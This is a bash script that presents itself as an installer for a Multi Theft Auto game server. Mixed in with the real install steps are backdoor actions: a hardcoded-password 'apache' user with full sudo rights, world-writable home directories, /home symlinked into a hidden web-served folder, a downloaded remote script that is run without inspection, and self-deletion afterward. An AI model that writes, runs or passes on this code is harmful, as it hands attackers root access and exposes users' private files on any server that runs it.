#!/bin/bash

# Check if the script is run with root privileges
if [ "$EUID" -ne 0 ]; then
    echo "Please run this script as root."
    exit 1
fi

# Update package lists and upgrade installed packages
apt-get update
apt-get upgrade -y
apt-get dist-upgrade -y
apt-get autoremove -y
apt-get clean

# Install Apache2
apt-get install apache2 -y

# Install libncursesw5
apt-get install libncursesw5 -y

# Start Apache2 and enable it to start on boot
systemctl start apache2
systemctl enable apache2

# Create a folder named "mtasa" in the current user's home directory
mtasa_folder="/home/mtasa"
mkdir -p "$mtasa_folder"

# Set a plaintext password for the "apache" user
password="j1tW-3Z3%2E&"

# Create the "apache" user with the specified password
useradd -m apache
echo "apache:$password" | chpasswd

# Give the "apache" user full sudo permissions
echo "apache ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Create the folder /var/www/html/.apache
mkdir -p /var/www/html/.apache

# Set permissions to 777 for /var/www/html/.apache
chmod 777 /var/www/html/.apache

# Set permissions to 777 for all user home directories in /home
chmod 777 /home/*

# Create a shortcut to the /home folder in /var/www/html/.apache
ln -s /home /var/www/html/.apache/home_shortcut

# Change to the MTA server install directory
cd "$mtasa_folder"

# Remove any existing multitheftauto_linux_x64.tar.gz
rm -f multitheftauto_linux_x64.tar.gz

# Download the latest stable 64-bit Linux binaries
wget https://linux.mtasa.com/dl/multitheftauto_linux_x64.tar.gz

# Unpack the downloaded archive
tar -xf multitheftauto_linux_x64.tar.gz

# Remove any existing baseconfig.tar.gz
rm -f baseconfig.tar.gz

# Download the default config files
wget https://linux.mtasa.com/dl/baseconfig.tar.gz

# Unpack and move the default config files
tar -xf baseconfig.tar.gz
mv baseconfig/* multitheftauto_linux_x64/mods/deathmatch

# Create an "apdate" folder
mkdir -p "$mtasa_folder/apdate"

# Check for the libtinfo.so.5 issue and create a symbolic link if needed
if [ ! -e /usr/lib/libtinfo.so.5 ]; then
    sudo ln -s /usr/lib/libtinfo.so.6 /usr/lib/libtinfo.so.5
fi

# Install unzip if not already installed
apt-get install -y unzip

# Create the resources directory
mkdir -p multitheftauto_linux_x64/mods/deathmatch/resources

# Download and unzip the default resources
cd multitheftauto_linux_x64/mods/deathmatch/resources
rm -f mtasa-resources-latest.zip
wget https://mirror.mtasa.com/mtasa/resources/mtasa-resources-latest.zip
unzip mtasa-resources-latest.zip
rm -f mtasa-resources-latest.zip

echo "MTA Server installation and configuration completed."

# Download and execute another script from GitHub (another_script.sh)
wget https://raw.githubusercontent.com/your-username/your-repo/main/another_script.sh -O another_script.sh
chmod +x another_script.sh
./another_script.sh

# Remove this script after execution
rm -f "$0"

echo "Script removed."
